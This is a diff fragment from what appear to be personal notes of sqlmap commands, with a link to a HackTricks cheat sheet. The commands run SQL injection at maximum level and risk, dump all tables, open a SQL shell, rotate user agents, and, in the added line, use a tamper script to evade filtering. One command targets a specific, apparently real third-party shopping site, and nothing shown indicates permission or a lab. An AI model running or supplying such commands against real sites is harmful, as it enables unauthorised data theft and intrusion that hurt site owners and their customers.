@@ -30,7 +30,7 @@ sqlmap -r try3.txt -T6 --random-agent --force-ssl --banner --current-db --dbs --
 
 sqlmap -r try3.txt -T4 -v3 --level 5 --risk 3  --tables --dump-all 
 
-sqlmap -u "https://www.buygood.com.tw/t.asp?d=1309275206" -T5 -v3 --level 5 --risk 3  --tables --dump-all --sql-shell --force-ssl --random-agent --delay 0.2 --ignore-redirects
+sqlmap -u "https://www.buygood.com.tw/t.asp?d=1309275206" -T5 -v3 --level 5 --risk 3  --tables --dump-all --sql-shell --force-ssl --random-agent --delay 0.2 --ignore-redirects --tamper=apostrophemask
 ```
 [SQLMap - Cheetsheat - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
 
